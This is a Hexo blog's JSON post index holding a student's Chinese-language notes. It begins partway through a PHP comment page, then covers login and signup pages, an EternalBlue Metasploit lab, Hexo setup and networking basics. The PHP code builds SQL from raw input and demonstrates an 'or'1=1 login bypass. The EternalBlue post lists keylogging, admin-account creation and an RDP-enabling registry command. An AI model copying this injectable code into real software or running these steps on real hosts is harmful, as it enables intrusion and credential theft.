if(empty($comment))&#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;评论内容不能为空！&lt;/div&gt;&lt;br&gt;&quot;; &#125;else&#123; $insert=&quot;INSERT INTO comments (comment) VALUES ($comment)&quot;; $result1=$link-&gt;query($insert); if($result1===true)&#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;评论发表成功！&lt;/div&gt;&lt;br&gt;&quot;; &#125;else&#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;&quot;.$insert .&quot;&lt;/div&gt;&lt;br&gt;&quot;; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;评论发表失败！&lt;/div&gt;&lt;br&gt;&quot;; &#125; &#125; &#125; //从表中查询数据 $select=&quot;SELECT comment FROM comments ORDER BY id DESC &quot;; $result2=$link-&gt;query($select); if ($result2-&gt;num_rows &gt; 0) &#123; // 输出数据 while($row = $result2-&gt;fetch_assoc()) &#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;&quot;. $row[&quot;comment&quot;]. &quot;&lt;/div&gt;&lt;br&gt;&quot;; &#125; &#125; else &#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;0 结果&lt;/div&gt;&quot;; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; 效果如下： 5，将上述两个功能块加入书主页面 在main.php中写入以下代码： 12345678&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;left&quot;&gt; &lt;?php include &#x27;upload.php&#x27;; ?&gt; &lt;/div&gt; &lt;div class=&quot;right&quot;&gt; &lt;?php include &#x27;mycomments.php&#x27;; ?&gt; &lt;/div&gt; &lt;/div&gt; 效果如图所示： 6，新建signip.php和link_ip.php，编写注册页面 在link_ip.php中写入以下代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpheader(&#x27;content-type:text/html; charset= utf-8&#x27;);session_start();$username=trim($_POST[&#x27;username&#x27;]);$password1=trim($_POST[&#x27;password1&#x27;]);$password2=trim($_POST[&#x27;password2&#x27;]);$link=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;); // 检查连接是否成功 if ($conn-&gt;connect_error) &#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接失败!&lt;/div&gt;&lt;br&gt;&quot;; &#125;else&#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接成功！&lt;/div&gt;&lt;br&gt;&quot;; &#125;if(isset($_POST[&#x27;login&#x27;]))&#123; echo &quot;跳转到登录页面！&quot;; header(&quot;Location: login.php&quot;); exit();&#125;else if(isset($_POST[&#x27;signup&#x27;])) &#123; if(empty($username) || empty($password1) || empty($password2))&#123; echo &quot;输入不能为空！&quot;; header(&quot;Location: signup.php&quot;); exit(); &#125;else if($password1!=$password2)&#123; echo &quot;两次输入的密码不一致&quot;; header(&quot;Location: signup.php&quot;); exit(); &#125;else&#123; echo &quot;两次输入的密码一致！&quot;; $seclect=&quot;select * from users where username=&#x27;$username&#x27; and password=&#x27;$password1&#x27; &quot;; $result=$link-&gt;query($seclect); if(($result-&gt;num_rows)&gt;0)&#123; echo &quot;该用户已存在！&quot;; header(&quot;Location: signup.php&quot;); &#125;else&#123; $sql=&quot;INSERT INTO users (username,password,isadm) VALUES (&#x27;$username&#x27;,&#x27;$password1&#x27;,0)&quot;; if ($link-&gt;query($sql) === TRUE) &#123; echo &quot;用户注册成功！&quot;; echo $sql . &quot;&lt;br&gt;&quot; ; header(&quot;Location: login.php&quot;); &#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; ; echo &quot;用户注册失败！&quot;; header(&quot;Location: signup.php&quot;); &#125; &#125; &#125;&#125;?&gt; 效果如图所示：","categories":[],"tags":[]},{"title":"九，php搭建登录页面","slug":"九，php搭建登录页面","date":"2023-11-13T09:14:32.000Z","updated":"2023-11-13T10:06:36.462Z","comments":true,"path":"2023/11/13/九，php搭建登录页面/","permalink":"http://example.com/2023/11/13/%E4%B9%9D%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/","excerpt":"","text":"1，在官网https://www.xp.cn/下载小皮面板PHP study 2，打开PHP study开启Apache和MySQL环境 3，点击网站项，打开网站根目录：C:\\phpStudy_64\\phpstudy_pro\\WWW 4，删除初始文件，新建index.php文件，用vscode进行编辑HTML效果为： 代码如下： 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;白的网站&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;link.php&quot;&gt; &lt;tr&gt; &lt;td&gt;用户名：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt;&lt;br&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密码：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt;&lt;br&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;checkbox&quot; name=&quot;rember&quot; value=&quot;yes&quot;&gt;记住密码&lt;/td&gt;&lt;br&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;reset&quot; name=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 5，用PHP编写登录功能， 若用户名或密码的输入为空，则显示用户名或密码为空，并返回index页面 若输入的用户名和密码在数据库中没有或不对应，则显示用户名或密码不正确，并返回index页面 若输入的用户名和密码在数据库中存在且对应，则跳转到zhuye页面 代码如下： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpheader(&#x27;content-type:text/html; charset= utf-8&#x27;);session_start();$username=trim($_POST[&#x27;username&#x27;]);$password=trim($_POST[&#x27;password&#x27;]);echo strlen($username);echo strlen($password);if(empty($username) || empty($password))&#123; echo &#x27;用户或密码不能为空！&#x27;; header(&quot;Location: index.php&quot;); exit;&#125;else&#123; $link=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;); // 检查连接是否成功 if ($conn-&gt;connect_error) &#123; echo &quot;数据库连接失败&quot;; &#125;else&#123; echo &quot;数据库连接成功！&quot;; &#125; $seclect=&quot;select * from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27; &quot;; $result=$link-&gt;query($seclect); if(($result-&gt;num_rows)&gt;0)&#123; $_SESSION[&#x27;user&#x27;]=$username; setcookie(&#x27;user&#x27;,$username,time()+7*12*60*60); echo &quot;登录成功！&quot;; header(&quot;Location: zhuye.php&quot;); exit(); &#125;else&#123; echo &#x27;账号或密码错误！&#x27;; header(&quot;Location: index.php&quot;); exit(); &#125;&#125;?&gt; 6，编写zhuye页面，先检测是否有user cookie 若存在，则显示成功，用户名和user cookie的值 若不存在，则显示失败 代码如下： 12345678910&lt;?phpheader(&#x27;content-type:text/html; charset= utf-8&#x27;);session_start();if(isset($_COOKIE[user]))&#123; echo &quot;成功&lt;br&gt;&quot;; echo &quot;用户名为：&quot;.$_SESSION[user].&quot; &lt;br&gt;&quot;; echo &quot;登录时设置的user cookie：&quot;.$_COOKIE[user];&#125;else&#123; echo &quot;失败！&quot;;&#125; 登录成功效果如下： 7，可以通过在浏览器的开发者工具和yakit中更改cookie的值来修改登录后的页面，效果如下： 8，因为sql语句”select * from users where username&#x3D;’$username’ and password&#x3D;’$password’ “;是拼接的，所以当用户名输入’or’1&#x3D;1，密码也输入’or’1&#x3D;1时会发生SQL注入也可以登录成功，效果如下：","categories":[],"tags":[]},{"title":"八，永恒之蓝漏洞利用","slug":"八，永恒之蓝漏洞利用","date":"2023-11-10T08:10:03.000Z","updated":"2023-11-10T11:02:15.765Z","comments":true,"path":"2023/11/10/八，永恒之蓝漏洞利用/","permalink":"http://example.com/2023/11/10/%E5%85%AB%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"","text":"1，准备kali-linux 和windows7（未装补丁）两个虚拟机 2，确保kali-linux 和 windows7 两个虚拟机都为桥接模式 3，Kali-Linux改为以root用户登录 4，查看Windows7和kali-Linux的IP地址 5，通过ping命令，测试两台虚拟机是否能连通 6，kali-linux输入msfconsole启动msf（若不是root登陆需sudo提升权限） 。#msfconsole会启动metasploit，命令提示行显示msf则启动成功。 7，输入search ms17-010查看漏洞模块 3 auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010是永恒之蓝扫描模块，探测主机是否存在ms17-010漏洞。 0 exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue是永恒之蓝攻击代码，一般两者配合使用，前者先扫描，若是显示有漏洞，再进行攻击。 8，扫描过程 可以使用use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010或者use 3命令 9，攻击过程 可以使用use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue或者use 0命令 10，显示远程主机系统信息： sysinfo 11，通过 meterpreter 获取屏幕快照： screenshot 12，上传文件到Windows主机，并从Windows主机中下载文件 上传文件：upload kali的文件地址 Windows的保存路径 下载文件 ：download kali的保存路径 windows的文件地址 13，添加用户并到管理员组 123net user uname pass /add 添加用户名为name，密码为passnet localgroup Administrators uname /add 将用户名为uname的用户添加到管理员组net user uname /del 删除uname用户 14，键盘监听 ps 看（explorer.exe）进程号 migrate 1892（进程号） 迁移 keyscan_start 键盘监听 keyscan_dump 看键盘输入了什么 15，远程登陆目标主机 C:\\WINDOWS\\system32&gt;net user admin &#x2F;active:yes开启远程管理服务C:\\Windows\\system32&gt;reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f","categories":[],"tags":[]},{"title":"七，更改hexo博客主题","slug":"七，更改hexo博客主题","date":"2023-11-09T08:48:31.000Z","updated":"2023-11-09T08:58:54.846Z","comments":true,"path":"2023/11/09/七，更改hexo博客主题/","permalink":"http://example.com/2023/11/09/%E4%B8%83%EF%BC%8C%E6%9B%B4%E6%94%B9hexo%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98/","excerpt":"","text":"1,在hexo博客主题官网上选择一个合适的主题 2，点击跳转到该主题的GitHub网站，并找到安装操作步骤 3，在本地博客文件的根目录打开git输入安装命令 1git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 4，打开站点配置文件，找到theme字段，将其值更改为 pure 1theme: pure 5，更新主题 12cd themes/puregit pull 6，进行预览 1hexo s 7,清除Hexo生成的静态文件 1hexo clean 8,部署至GitHub仓库 1hexo d -g 在浏览器中输入网址：https://baiqstar.github.io/，效果如下图所示：","categories":[],"tags":[]},{"title":"六，常见的网络拓扑结构","slug":"六，常见的网络拓扑结构","date":"2023-11-08T12:07:41.000Z","updated":"2023-11-08T12:23:31.899Z","comments":true,"path":"2023/11/08/六，常见的网络拓扑结构/","permalink":"http://example.com/2023/11/08/%E5%85%AD%EF%BC%8C%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84/","excerpt":"","text":"常见的网络拓扑结构有以下6种：1.总线型网络拓扑结构；2.星型网络拓扑结构；3.环形网络拓扑结构；4.树型网络拓扑结构；5.网状网络拓扑结构；6.混合网络型拓扑结构。 1.总线型网络拓扑结构​ 总线型结构是将网络中的所有设备通过相应的硬件接口直接连接到公共总线上，结点之间按广播方式通信，一个结点发出的信息，总线上的其它结点均可“收听”到。 总线型结构就像一张树叶,有一条主干线,主干线上面由很多分支。总线型拓扑结构图如下: 优点： 结构简单，可扩充性好； 当需要增加节点时，只需要在总线上增加一个分支接口便可与分支节点相连，当总线负载不允许时还可以扩充总线； 缺点： 维护难，分支节点故障查找难。 这种网络因为各节点是共用总线带宽的，所以在传输速度上会随着接入网络的用户的增多而下降； 2.星型网络拓扑结构​ 星型结构是一种以中央节点为中心，把若干外围节点连接起来的辐射式互联结构。这种结构适用于局域网，特别是近年来连接的局域网大都采用这种连接方式。这种连接方式以双绞线或同轴电缆作连接线路。星型拓扑结构图如下: 优点： 控制简单。任何一站点只和中央节点相连接，因而介质访问控制方法简单，致使访问协议也十分简单。易于网络监控和管理。 故障诊断和隔离容易。中央节点对连接线路可以逐一隔离进行故障检测和定位，单个连接点的故障只影响一个设备，不会影响全网。 3.环形网络拓扑结构​ 环形结构各结点通过通信线路组成闭合回路，环中数据只能单向传输，信息在每台设备上的延时时间是固定的，特别适合实时控制的局域网系统。环形结构就如一串珍珠项链,环形结构上的每台计算机就是项链上的一个个珠子。环形拓扑结构图如下: 特点： 信息流在网中是沿着固定方向流动的，两个节点仅有一条道路，故简化了路径选择的控制； 环路上各节点都是自主控制，故控制软件简单； 由于信息源在环路中是串行地穿过各个节点，当环中节点过多时，势必影响信息传输速率，使网络的响应时间延长； 4.树型网络拓扑结构​ 树型拓扑结构是一种层次结构，结点按层次连结，信息交换主要在上下结点之间进行，相邻结点或同层结点之间一般不进行数据交换。树型拓扑结构是就是数据结构中的树。树型拓扑结构图如下: 特点： ● 网络结构简单，便于管理；● 控制简单，建网容易；● 网络延迟时间较短，误码率较低；● 网络共享能力较差；● 通信线路利用率不高；● 中央结点负荷太重。 三层结构分为核心层，汇聚层和接入层， 接入层：无线网络发射器，AP（提供接入网络的接口）汇聚层：楼层交换机、建筑物交换机（汇聚接入层设备）核心层：核心交换机（数据高速转发） 5.网状网络拓扑结构​ 网络拓扑结构又称作无规则结构，结点之间的联结是任意的，没有规律。网状拓扑结构图如下: 特点如下：●网络可靠性高，一般通信子网中任意两个节点交换机之间，存在着两条或两条以上的通信路径，这样，当一条路径发生故障时，还可以通过另一条路径把信息送至节点交换机。●网络可组建成各种形状，采用多种通信信道，多种传输速率。●网内节点共享资源容易。●可改善线路的信息流量分配。●可选择最佳路径，传输延迟小。 6.混合网络型拓扑结构​ 混合型网络拓扑结构就是指同时使用上面的5种网络拓扑结构种两种或两种以上的网络拓扑结构。这种网络拓扑结构是由星型结构和总线型结构的网络结合在一起的网络结构，这样的拓扑结构更能满足较大网络的拓展，解决星型网络在传输距离上的局限，而同时又解决了总线型网络在连接用户数量的限制。这种网络拓扑结构同时兼顾了星型网与总线型网络的优点，在缺点方面得到了一定的弥补。 特点： 应用广泛 扩展灵活 性能差 较难维护","categories":[],"tags":[]},{"title":"五，VMware的三种网络连接模式","slug":"五，VMware的三种网络连接模式","date":"2023-11-08T11:47:27.000Z","updated":"2023-11-08T12:06:30.949Z","comments":true,"path":"2023/11/08/五，VMware的三种网络连接模式/","permalink":"http://example.com/2023/11/08/%E4%BA%94%EF%BC%8CVMware%E7%9A%84%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"安装完成vmware以后进入虚拟机—&gt;&gt;设置—&gt;&gt;网络适配器 ​ 在网络适配器中可以发现vmware为我们提供了三种网络工作模式，它们分别是：1,Bridged（桥接模式）直接连接物理网络2,NAT（网络地址转换模式）与主机共享IP地址3,Host-Only（仅主机模式）与主机共享的专用网络 VMnet0表示的是用于桥接模式下的虚拟交换机； VMnet1表示的是用于仅主机模式下的虚拟交换机； VMnet8表示的是用于NAT模式下的虚拟交换机； Bridged（桥接模式）​ 桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。 其网络结构如下图所示： ​ 虚拟机可以连接外网，可以和同网段的其他真实物理主机之间相互访问呢，可以和相同模式的虚拟机之间相互访问。此模式用于ip地址资源比较充足的情况缺点：​ 但如果你的网络环境是ip资源很缺少或对ip管理比较严格的话，那桥接模式就不太适用了。 NAT（地址转换模式）NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。其网络结构如下图所示： ​ 在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。 ​ 此时，虚拟机可以连接外网（NAT实现），可以和相同模式的虚拟机之间相互访问（同一交换机下），但不可以和同网段的其他真实物理主机之间相互访问（不同子网，且没有第三层路由器）。此模式用于ip地址资源比较稀缺的情况。 ​ 然后，将VMware Network Adapter VMnet8启用之后，发现远程工具可以连接上虚拟机了。那么，这就是NAT模式，利用虚拟的NAT设备以及虚拟DHCP服务器来使虚拟机连接外网，而VMware Network Adapter VMnet8虚拟网卡是用来与虚拟机通信的。 Host-Only（仅主机模式）​ Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示： ipv4地址由32为二进制数组成，每四位用空格隔开，每八位用逗号隔开 私有地址范围：A段：10.0.0.0-10.255.255.255B段：172.16.0.0-172.31.255.255C段：192.168.0.0-192.168.255.255 https://myip.ipip.net 用于查看公网IP地址 子网掩码255.255.255.0标志前24位相同的数字在同一网络下，后8位是主机号前24位是网络号","categories":[],"tags":[]},{"title":"四，markdown语法","slug":"四，markdown语法","date":"2023-11-08T11:02:10.000Z","updated":"2023-11-08T11:45:31.829Z","comments":true,"path":"2023/11/08/四，markdown语法/","permalink":"http://example.com/2023/11/08/%E5%9B%9B%EF%BC%8Cmarkdown%E8%AF%AD%E6%B3%95/","excerpt":"","text":"标题：用#来表示格式，以#的数量表示标题的大小，效果如图： 字体设置斜体、粗体、删除线： 链接：1，插入图片链接： 格式为： 2，Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用&lt;&gt;包起来， Markdown 就会自动把它转成链接。也可以直接写，也是可以显示成链接形式的 分割线：可以在一行中用三个以上的星号(*)、减号(-)、底线(_)来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。 代码块：用三个~来表示格式，效果如下： 1main 引用：在被引用的文本前加上&gt;符号，以及一个空格就可以了，如果只输入了一个&gt;符号会产生一个空白的引用。 列表：1，无序列表 使用 *，+，- 表示无序列表。注意：符号后面一定要有一个空格，起到缩进的作用。 2，有序列表 使用数字和一个英文句点表示有序列表。注意：英文句点后面一定要有一个空格，起到缩进的作用。 3，无序列表和有序列表同时使用 表格： 换行：方法1: 连续两个以上空格+回车方法2：使用html语言换行标签： 缩进字符：、 特殊符号：","categories":[],"tags":[]},{"title":"三，Typora+PicGo+Github保证博客中图片显示","slug":"三，Typora-PicGo-Github保证博客中图片显示","date":"2023-11-08T03:11:38.000Z","updated":"2023-11-08T03:27:35.097Z","comments":true,"path":"2023/11/08/三，Typora-PicGo-Github保证博客中图片显示/","permalink":"http://example.com/2023/11/08/%E4%B8%89%EF%BC%8CTypora-PicGo-Github%E4%BF%9D%E8%AF%81%E5%8D%9A%E5%AE%A2%E4%B8%AD%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA/","excerpt":"","text":"为了方便写作，我们可以采用Typora+PicGo+Github的方案来搭建我们的博客写作环境。 Typora：它是一款轻便简洁的Markdown编辑器，支持即时渲染技术，即所写立刻所见，少了排版的时间，专注于文章内容的编辑。 PicGo:它是一个用于快速上传图片并获取图片 URL 链接的工具，支持多种图库。 Github:代码托管工具，除了代码，还可以用作图片存储。 在我们的博客写作中，可以达成这样的需求： 使用Markdown编辑博客 一篇博客发布多个平台 图片一次上传，处处引用 操作步骤： 安装好Typora和PicGo软件，并准备一个GitHub账号 登录Github并创建一个公开的仓库，需要注意仓库必须是公开的，否则无法预览。 设置token 点击右上角头像-settings，然后点击developer settings，点击personal access tokens。 点击tokens (classic)，点击create new token(classic) 设置权限 复制token PicGo配置Github图床 点击左边图床设置，选择GitHub图床，具体配置如下 设定仓库名，填写：GitHub名&#x2F;库名 分支，默认填main 设定Token，刚才保存的token令牌 指定存储路径，默认填img&#x2F; 自定义域名为https://cdn.jsdelivr.net/gh/你的github用户名/你的仓库名@分支（一般为main）/ 图床接入 接下来可以在 Typora中接入我们的图床了。 打开Typora，找到文件-&gt;偏好设置-&gt;图像 进行如下配置 6.上传图片 上传后图片就在GitHub中设置的仓库中的文件夹中了","categories":[],"tags":[]},{"title":"图片猫","slug":"图片猫","date":"2023-11-07T12:44:22.000Z","updated":"2023-11-08T02:31:56.984Z","comments":true,"path":"2023/11/07/图片猫/","permalink":"http://example.com/2023/11/07/%E5%9B%BE%E7%89%87%E7%8C%AB/","excerpt":"","text":"mao","categories":[],"tags":[]},{"title":"二，发布新增文章到博客","slug":"二，发布新增文章到博客","date":"2023-11-07T12:20:49.000Z","updated":"2023-11-07T12:28:05.218Z","comments":true,"path":"2023/11/07/二，发布新增文章到博客/","permalink":"http://example.com/2023/11/07/%E4%BA%8C%EF%BC%8C%E5%8F%91%E5%B8%83%E6%96%B0%E5%A2%9E%E6%96%87%E7%AB%A0%E5%88%B0%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"1，安装扩展： 1npm i hexo-deployer-git 2，新建文章： 1hexo new post &quot;我的第一篇博客&quot; 执行后会在C:\\MyBlog\\blog\\source_posts中新增一个文件夹和一个.md文件 一个用来存放你的图片等数据，另一个就是你的文章文件啦。 3，编写markdown文件 4，生成静态网页 1hexo g 5,查看本地预览效果 1hexo s 6,上传到github上 1hexo d 注意： 本地仓库在C:\\MyBlog\\blog\\public中 需要删除文件的话要先将本地文件删除后在上传同步一次GitHub","categories":[],"tags":[]},{"title":"","slug":"一，利用github搭建hexo博客","date":"2023-11-07T11:34:02.561Z","updated":"2023-11-08T02:37:30.997Z","comments":true,"path":"2023/11/07/一，利用github搭建hexo博客/","permalink":"http://example.com/2023/11/07/%E4%B8%80%EF%BC%8C%E5%88%A9%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"一，利用github搭建hexo博客搭建前的准备： 提前安装好(node.js)[https://nodejs.org/en] 左边的那个 提前安装好(GIt)[https://git-scm.com/downloads] 提前注册好一个github账号 操作步骤： 在本地找个目录放博客源文件，路径不要有中文 在选定的目录中，右键Git Bash Here 使用npm命令安装Hexo，输入: 1234npm install -g hexo-cli #全局安装hexo-clihexo init blog #使用Hexo初始化一个新的博客项目名称为blogcd blog #进入blog文件夹hexo g #使用Hexo生成静态文件 回车构建好后出现如下效果图 按顺序执行以下三条命令便可查看网站雏形 123hexo new test_my_site #使用Hexo创建一个新的博客项目名称为test_my_sitehexo g #使用Hexo生成静态文件hexo s #使用Hexo启动本地服务器,可以进行网站预览 在浏览器中输入网址localhost:4000，效果图如下： 配置ssh 1cd ~/.ssh #检查本机已存在的ssh密钥 如果提示：No such file or directory 说明你是第一次使用git。 1ssh-keygen -t rsa -C “邮件地址” 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key key填写C:\\Users\\Administrator.ssh\\id_rsa.pub中的内容，填写钥匙名并创建 尝试ssh连接,测试是否成功 1ssh -T git@github.com # 注意邮箱地址不用改 如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功： 1Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access. 在选中的位置(blog目录下)打开cmd(以管理员身份) 1npm install hexo-deployer-git –save 在上一个Git Bash Here还需要继续配置 12git config --global user.name &quot;luozhixiaowo&quot;// 你的github用户名，非昵称git config --global user.email &quot;xxx@qq.com&quot;// 填写你的github注册邮箱 准备上传代码 在github上新建一个存储库，命名为github的用户名.github.io 编辑_config.yml文件，在最后改成这样 1234deploy: type: git repository: git@github.com:luozhixiaowo/luozhixiaowo.github.io.git branch: main 注意保持格式，缩进不对，会导致一会儿，上传不成功 最后上传 12hexo d每次上传成功之后，需要等待1-3分钟，用来刷新页面 在创建的存储库的设置中-pages-如图设置 最后在浏览器中输入网址baiQstar.github.io就可访问网站了 总结： 注意英文输入，命令含中文符号会报错 在设置用户名和邮箱时注意将—改为– 注意在blog文件夹中进行操作","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2023-11-07T07:22:12.264Z","updated":"2023-11-07T07:22:12.264Z","comments":true,"path":"2023/11/07/hello-world/","permalink":"http://example.com/2023/11/07/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}